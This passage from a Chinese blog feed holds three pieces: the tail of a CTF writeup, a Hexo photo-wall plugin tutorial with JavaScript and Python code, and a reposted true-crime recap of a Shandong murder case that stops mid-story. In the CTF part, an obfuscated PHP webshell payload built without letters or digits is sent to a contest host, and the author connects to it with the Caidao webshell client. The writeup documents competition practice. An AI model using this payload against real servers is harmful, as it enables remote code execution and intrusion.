<p>直接使用PHP curl提交，防止使用Python造成字符串编码。然而有个问题，我没有处理Cookie的问题，本想接下来处理，为啥直接出flag了？<br>5.Web300<br>封锁了字母+数字，以及一定的特殊符号，但是没有ban <em>();[]$，就可以构造了。参考Webshell混淆的思路，构造出一个来。<br><a href="http://114.215.71.135:10080/?content=$" target="_blank" rel="noopener">http://114.215.71.135:10080/?content=$</a></em>=’’;$<em>[%2b$</em>]%2b%2b;$<em>=$</em>.’’;$<strong>=$<em>[%2b’’];$</em>=$</strong>;$<strong><em>=$</em>;$</strong>=$<em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$__</em>.=$<strong>;$_</strong>.=$<strong>;$</strong>=$<em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$__</em>.=$<strong>;$</strong>=$<em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong></em>.=$<strong>;$</strong>=$<em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong></em>.=$<strong>;$__</strong>=’<em>‘;$__=$</em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$__</strong>.=$<strong>;$</strong>=$<em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>__.=$</strong>;$__=$</em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>__.=$</strong>;$<strong>=$_;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>__.=$</strong>;$<em>=$$<strong>__;$</strong></em>($<em>[</em>]);<br>菜刀用_连接就可以了。</p>
<ul>
<li>by Vicen</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo插件-图片墙功能]]></title>
      <url>/2017/11/23/hexo-photo/</url>
      <content type="html"><![CDATA[<h1 id="1、关于"><a href="#1、关于" class="headerlink" title="1、关于"></a>1、关于</h1><p>其实yilia主题的博主的blog是有一个相册功能的，源码在他的github上，但是用的是Instagram的api接口，网上好多人说ins的api已经关闭了，那么也就获取不了照片信息了。所以还是决定选择从本地上传图片到github做图片墙。参考原博在</p>
<blockquote>
<p><a href="http://blog.csdn.net/u013082989/article/details/70162293" target="_blank" rel="noopener">http://blog.csdn.net/u013082989/article/details/70162293</a>  </p>
</blockquote>
<p><img src="https://ss3.baidu.com/-fo3dSag_xI4khGko9WTAnF6hhy/image/h%3D300/sign=a23013e971cb0a469a228d395b62f63e/7dd98d1001e939018ffc7c2d71ec54e736d19623.jpg" alt=""></p>
<a id="more"></a>
<h1 id="2、方案"><a href="#2、方案" class="headerlink" title="2、方案"></a>2、方案</h1><ul>
<li>在github上新建一个仓库，主要用于存储图片，可以通过url访问到，也方便管理</li>
</ul>
<ul>
<li><p>将要放到相册的图片处理成json格式的数据，然后进行访问，这里json的格式需要配</p>
</li>
<li><p>合要使用的样式，所以需要处理成特定格式的json数据，下面会给出</p>
</li>
</ul>
<ul>
<li>图片裁剪，因为相册显示的样式最好是正方形的的图片，这里使用脚本处理一下</li>
</ul>
<ul>
<li>图片压缩，相册显示的图片是压缩后的图片，提高加载的速度，打开后的图片是原图。  </li>
</ul>
<h1 id="3、实现"><a href="#3、实现" class="headerlink" title="3、实现"></a>3、实现</h1><ul>
<li>在git上新建一个仓库来存储照片，样式文件参考<a href="https://github.com/lawlite19/Blog-Back-Up" target="_blank" rel="noopener">lawlite19</a>的github。</li>
<li><p>修改ins.js文件，其中的url对应到你的github放图片的地址（就是打开github上的照片时显示的网址信息）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> ulTmpl = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>, len2 = res.list.length; j &lt; len2; j++) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = res.list[j].arr;</span><br><span class="line">    <span class="keyword">var</span> liTmpl = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = data.link.length; i &lt; len; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> minSrc = <span class="string">'https://raw.githubusercontent.com/lawlite19/blog-back-up/master/min_photos/'</span> + data.link[i];</span><br><span class="line">      <span class="keyword">var</span> src = <span class="string">'https://raw.githubusercontent.com/lawlite19/blog-back-up/master/photos/'</span> + data.link[i];</span><br><span class="line">      <span class="keyword">var</span> type = data.type[i];</span><br><span class="line">      <span class="keyword">var</span> target = src + (type === <span class="string">'video'</span> ? <span class="string">'.mp4'</span> : <span class="string">'.jpg'</span>);</span><br><span class="line">      src += <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">      liTmpl += <span class="string">'&lt;figure class="thumb" itemprop="associatedMedia" itemscope="" itemtype="http://schema.org/ImageObject"&gt;\</span></span><br><span class="line"><span class="string">            &lt;a href="'</span> + src + <span class="string">'" itemprop="contentUrl" data-size="1080x1080" data-type="'</span> + type + <span class="string">'" data-target="'</span> + src + <span class="string">'"&gt;\</span></span><br><span class="line"><span class="string">              &lt;img class="reward-img" data-type="'</span> + type + <span class="string">'" data-src="'</span> + minSrc + <span class="string">'" src="/assets/img/empty.png" itemprop="thumbnail" onload="lzld(this)"&gt;\</span></span><br><span class="line"><span class="string">            &lt;/a&gt;\</span></span><br><span class="line"><span class="string">            &lt;figcaption style="display:none" itemprop="caption description"&gt;'</span> + data.text[i] + <span class="string">'&lt;/figcaption&gt;\</span></span><br><span class="line"><span class="string">        &lt;/figure&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ulTmpl = ulTmpl + <span class="string">'&lt;section class="archives album"&gt;&lt;h1 class="year"&gt;'</span> + data.year + <span class="string">'年&lt;em&gt;'</span> + data.month + <span class="string">'月&lt;/em&gt;&lt;/h1&gt;\</span></span><br><span class="line"><span class="string">    &lt;ul class="img-box-ul"&gt;'</span> + liTmpl + <span class="string">'&lt;/ul&gt;\</span></span><br><span class="line"><span class="string">    &lt;/section&gt;'</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>源码的<strong>Blog-Back-Up</strong>里面包含图片的python处理脚本文件<strong>tool.py</strong>，可以去图片的中间部分，裁剪为正方形。</p>
<ul>
<li>处理完成之后可以将处理后的图片提交到github上，需要输入github的账号信息。</li>
<li>然后将图片信息处理成json数据格式<br><img src="http://img.blog.csdn.net/20170413212556724?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzA4Mjk4OQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="">  </li>
<li>这里采用的方式是读取图片的名字作为其中的text的内容，最前面是日期，然后用<em>进行分隔，后面是图片的描述信息，注意不要包含</em>和.符号。<br><img src="http://img.blog.csdn.net/20170413212609912?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzA4Mjk4OQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="">  </li>
<li>注意代码中../lawlite19.github.io/source/photos/data.json要根据需要改成自己博客的路径，另外，我的环境是我windows，编码方式是gbk,直接提取图片命名会报错，所以对于file_list要先解码GBK然后再utf8编码。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">def handle_photo():</span><br><span class="line">    <span class="string">''</span><span class="string">'根据图片的文件名处理成需要的json格式的数据</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    -----------</span></span><br><span class="line"><span class="string">    最后将data.json文件存到博客的source/photos文件夹下</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br><span class="line">    src_dir, des_dir = <span class="string">"photos/"</span>, <span class="string">"min_photos/"</span></span><br><span class="line">    file_list = list_img_file(src_dir)</span><br><span class="line">    list_info = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(file_list)):</span><br><span class="line">        filename = file_list[i].decode(<span class="string">'gbk'</span>).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        date_str, info = filename.split(<span class="string">"_"</span>)</span><br><span class="line">        info, _ = info.split(<span class="string">"."</span>)</span><br><span class="line">        date = datetime.strptime(date_str, <span class="string">"%Y-%m-%d"</span>)</span><br><span class="line">        year_month = date_str[<span class="number">0</span>:<span class="number">7</span>]            </span><br><span class="line">        if i == 0:  # 处理第一个文件</span><br><span class="line">            new_dict = &#123;<span class="string">"date"</span>: year_month, <span class="string">"arr"</span>:&#123;<span class="string">'year'</span>: date.year,</span><br><span class="line">                                                                   <span class="string">'month'</span>: date.month,</span><br><span class="line">                                                                   <span class="string">'link'</span>: [filename],</span><br><span class="line">                                                                   <span class="string">'text'</span>: [info],</span><br><span class="line">                                                                   <span class="string">'type'</span>: [<span class="string">'image'</span>]</span><br><span class="line">                                                                   &#125;</span><br><span class="line">                                        &#125; </span><br><span class="line">            list_info.append(new_dict)</span><br><span class="line">        elif year_month != list_info[-1]['date']:  # 不是最后的一个日期，就新建一个dict</span><br><span class="line">            new_dict = &#123;<span class="string">"date"</span>: year_month, <span class="string">"arr"</span>:&#123;<span class="string">'year'</span>: date.year,</span><br><span class="line">                                                   <span class="string">'month'</span>: date.month,</span><br><span class="line">                                                   <span class="string">'link'</span>: [filename],</span><br><span class="line">                                                   <span class="string">'text'</span>: [info],</span><br><span class="line">                                                   <span class="string">'type'</span>: [<span class="string">'image'</span>]</span><br><span class="line">                                                   &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">            list_info.append(new_dict)</span><br><span class="line">        else:  # 同一个日期</span><br><span class="line">            list_info[<span class="number">-1</span>][<span class="string">'arr'</span>][<span class="string">'link'</span>].append(filename)</span><br><span class="line">            list_info[<span class="number">-1</span>][<span class="string">'arr'</span>][<span class="string">'text'</span>].append(info)</span><br><span class="line">            list_info[<span class="number">-1</span>][<span class="string">'arr'</span>][<span class="string">'type'</span>].append(<span class="string">'image'</span>)</span><br><span class="line">    list_info.reverse()  # 翻转</span><br><span class="line">    final_dict = &#123;<span class="string">"list"</span>: list_info&#125;</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"../../git/source/photos/data.json"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        json.dump(final_dict, fp)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> Hexo美化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[[摘]《今日说法》里最悬疑复杂的一案]]></title>
      <url>/2017/11/22/zl-jinrishuofa-xuanyi/</url>
      <content type="html"><![CDATA[<p>###原创 2017-11-19 李铃铛 大李吃西瓜###<br>周末愉快~今天我们这里降温了，冷的不行，在全国各地的大家也注意防寒保暖，健健康康！<br>今天来818《今日说法》里我感觉最悬疑最复杂的一案，每次想到都觉得心中一紧，在破案的警方看来，也是他们一生中很难遇到的案件。</p>
<p><img src="http://i1.bvimg.com/620384/e46ff774472b0e56.png" alt="">  </p>
<p>就是这部：</p>
<center><font color="#B22222" size="5" face="黑体">《烟锁殡仪馆》</font></center>

<a id="more"></a>
<p>在2010年7月13日，在山东省商河县孙集乡，一口机井里，有人发现了一具<strong><strong>全裸的男尸</strong></strong>。</p>
<p>这个尸体被塞在井里，头在下，脚在上，尸体已经高度腐烂，脸上没有肉了。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAiaH8KEfcrYYRNuTFDEpOwX7doudyoZBN70wbhNibTHKXI79s9mNJmOUA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>尸检出这个死者身高183，体重约90公斤，30-40岁之间，死亡时间预计在3个月至1年之前。</p>
<p>这个井口非常小，直径只有33cm，这个尸体几乎是被人硬塞进去的。</p>
<p>死亡原因是被钝器打击头骨，他的面骨被打到骨折，<strong><strong>无法用图像还原人物外貌</strong></strong>。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA0HlPWPmBDDicGPaThldZiaa8X5bDHzmiauaRqKLeLaG1dib2yGFpTUiag6g/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAMPLVjJib8ozqWaA8uQspibC98fjFLIgqAS0hgAoic4iaUDAqnC8rJibj71A/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA5zRicEH97FHicc93zSBicI9ia5Deg9pggbMib8XniadhYXibhvnpYibFicnnkPA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>因为是全裸，所以没有可以辨识他身份的东西。</p>
<p>他没有犯罪记录，也没有指纹登记。    </p>
<p>这个人是谁？</p>
<p>这成了警方第一件要确定的事情。</p>
<p>几乎在所有的案件里，确定<strong><strong>死者身份</strong></strong>，才能根据他的社会关系进一步破案，如果找不到他是谁，那真是无从查起。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAkNX5EC8T879g5uvU8JC0MFjaevCf1Pnt6FCkpIX8ibCG3k9AgBYiaMiaQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>再说现场环境。</p>
<p>这口井在离孙集乡王市村大约4、5公里的地方，这口井平时没什么人知道，包括种地的人也只是在没水了才想起来这还有口井。</p>
<p>井周围是一片草地，案发已经超过半年，经历了下雨等环境影响，四周也找不到有效的线索，没有脚印，没有遗留的衣物纤维，基本上什么都没有。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA2V4XytonuSmh5wG00zfr7nkmDNNicpXiaToOcz3FglGv4yxlX7hicoccw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>唯一的好消息是，<strong><strong>凶器</strong></strong>找到了。</p>
<p>就在这个机井下，警方发现了一把斧子。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAG6P1H3m2JOYUlMIJicGAHSBcpOs3WXhia9GXxRbAibw3ia33ojYhNFYCgg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>但是，这个斧子上没有血迹和指纹，并不能直接的给出什么线索。</p>
<p>于是警方又开始分析这个斧子，他们发现斧子木柄和锤头有加固片，并不是一般家用的，怀疑这就是买来作案用的。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAaicCMLcQsIe9iaeW7GunKs26MwxsIdlH8QC5oH2X86wgR0dKhDbRy6vg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAcEiadJwsS4yS6ic0FGRxWUosyVWlZQd5onjsTq2GaeO5YSOSNtWnNsDg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAMLTp6wlHMdQzSz8K1aKg0J2LL9XY8ot82vlPse0m9gmrLs7D6MzX4w/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""></p>
<p>于是走访商河五金店，最后找到了卖斧子的商店。</p>
<p>老板已经不记得谁买了，一共卖出去13把，她只能提供进货时间是2009年12月底。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAU8M1cnLySo2riaI4djMdicMoboBjM3K5QiavFxCF60M04ibbOl2kdW1jRg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>警方通过走访，有村民提供线索，2010年1月28日左右，有人发现机井附近看见过<strong><strong>红色的血迹</strong></strong>。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAQOgwuucbOaNciaaONbazLrrARJc8p8nic9sE1AqLJiaL6PMW39CpBw1Pw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAiagCcc6icwTR1td6cLo3v9VGUufLmcgs6Tx2CthrxatBibIP6Pynw3cRQ/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>于是警方把时间限制在2010年1月份失踪人口。</p>
<p>他们先从孙集乡开始查，查出有<strong><strong>17个失踪人口</strong></strong>，但是通过对比，却一个也不符合死者的条件。于是他们扩大了范围，甚至排查到山东失踪人口，全国失踪人口登记库，也没有符合的。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtArd4U0AJSaib1FTm9VFqkDWLmbtFBmhnGYjLCucfpArVvCvwpFcGrcYQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAaGPkvRSB6k8tOIreTEvaGj83dERaWPnDznoZDnycrAej5IBpCVL1gw/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>那么，死者可能不是本地人口，但是衣服都被脱掉，说明可能是在商河生活过的外地人，因为怕有人认出他，凶手才拿走了他的衣服，抛尸在机井。</p>
<p>但是这个范围太大了，他们走访探查，毫无线索。</p>
<p>想从死者身上下手破案的方式，行不通了。</p>
<p>看到这里，感觉这个案件就已经到死路了，破不了了，死者都不知道是谁，怎么破？</p>
<p>警方转变思路非常强大。</p>
<p>刑侦组翻查案件资料，开始注意到孙集乡失踪的17个人，其中有一个人的失踪时间，和这具尸体死亡时间很靠近，一个在一月份死亡，一个在三月份失踪。</p>
<p>这个在孙集乡失踪的本地人，叫王希元，是一个养鸡场的老板。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA2MPyDVJajRffDp4hd54iagZBuBA67fjI00pKPAB9revicohE24F7ghyA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAQoasI2MUVTicR2dzAD4VOyObEnf0ICoDB2XaJAiahKCEcAZmSr4QGh0g/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAjibI3iamSUPYHGhiaoxKicsbpIrfrtgz9U7oAO75nQfF7iaBXuo2OuUhFCg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtASPA95fpjbjiaguvapl8Sib1FkXJdml1pIibdW2gAAJtgmOtt3UJE6P7mw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>他身高只有165，体格瘦小，明显并<strong><strong>不是死者</strong></strong>。</p>
<p>能把183的死者头朝下塞到井里的，说明凶手至少也是一个相当魁梧的人，这个王希元，也<strong><strong>不是凶手</strong></strong>。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAT8Km8v1YhnTJQ01BolbHzywsiaicW5xzHyYeWSiaRCQNyo52XvYMHQFgg/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtADBCTB9UcJiaDCYdkN5SIqVibDYoKE5wdSls2v82icGJicdKQuDFnqy0w0g/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>但是这个王希元身上有件蹊跷的事情，他死亡前，把他买了只有半年的小汽车送到修理厂<strong><strong>整车喷漆</strong></strong>。</p>
<p>一听到整车喷漆，感觉就是运送尸体毁尸灭迹的节奏啊！</p>
<p>警方赶紧和法医去看这个车，因为王希元失踪了，车一直在修理厂。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAr9DS3ZKVG5QKLoVtnDJ4dIezlGlVmT33bnDEv83r9LpmnAkLdgq6XQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>在这个汽车上，发现了重要线索！</p>
<p>什么线索呢？</p>
<p>汽车车尾箱有一片落叶，落叶上有一个红点。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAAWjevVPUKkBbPCRKmEMQuibVsREdic9EcHHzkat4ooEkA7iawr2ICx5Bg/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>一片落叶上的红点，微小的几乎看不见，这个车做了喷漆，普通人会直接认为是油漆，但是警方仔细看，发现如果是油漆，那应该是硬的，但是<strong><strong>这个红点没有发硬</strong></strong>，怀疑是血液。</p>
<p>于是法医提取分析，确定了这个血液和无名死者的血液是一样的！</p>
<p><strong><strong>这个车就装过死者！</strong></strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAS4OvAYDHRia5Qnvax3Mh0znu4jib0AiajW20Onln9GwXrlS1b7gzAeyUA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>这下死者和失踪的王希元就联系起来了。</p>
<p>警方马上开始查王希元，发现他1月份的时候，频繁给天津两个手机打电话，其中一个电话，在<strong><strong>1月24日之后关机</strong></strong>。他们又联系了天津警方，找到了这两个电话的持有人。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtACVhgE6lQDFDE13AOq4AzIFib4tGib1mIlYdKf2bWxysc8b7zfRIdLu3A/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAMO3HVAfKIQcScJhVyepnWmBs5NY87csVnicWlCDlbnMUAqWOBZVqM8A/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>这两个人，那个电话关机的叫<strong><strong>韩本立</strong></strong>，一个叫<strong><strong>韩宝山</strong></strong>。</p>
<p>两个人是天津老乡，他们半年多前出去打工，刚好是案发时间，后来就和家里断了联系。</p>
<p>韩本立家人因为24号之后联系不上韩本立，还问过韩宝山，韩宝山说看见过韩本立，韩本立说去其他地方打工了。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtANsSiaaJp44tylDia0ib1KA74mnz8YbgKGGDNDf8SXbuo1iaaHnKHmRDhfA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>其中这个韩本立，<strong><strong>身高183</strong></strong>，很符合死者身份。</p>
<p>警方找到他家里，DNA一对比，果然，这个天津人韩本立就是死者！</p>
<p>这下终于确定了<strong><strong>死者的身份</strong></strong>。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAeGFTkFGzL05iasn9NVmYGgtYvMB6zztbM5EOCEmA32EAN162BX5fqqw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAfvkMdDvQMx09Dmcfehl1cAHhRQobJWLVd0nayictwjoszkGSOSfX7Xg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p>
<p>他们找到了另一位电话持有人韩宝山，开始审讯他和韩本立的情况，根据电话关机和家人线索，韩本立的死亡时间，是1月24日，可韩宝山怎么说24号后还见过他呢？</p>
<p>韩宝山在说谎。</p>
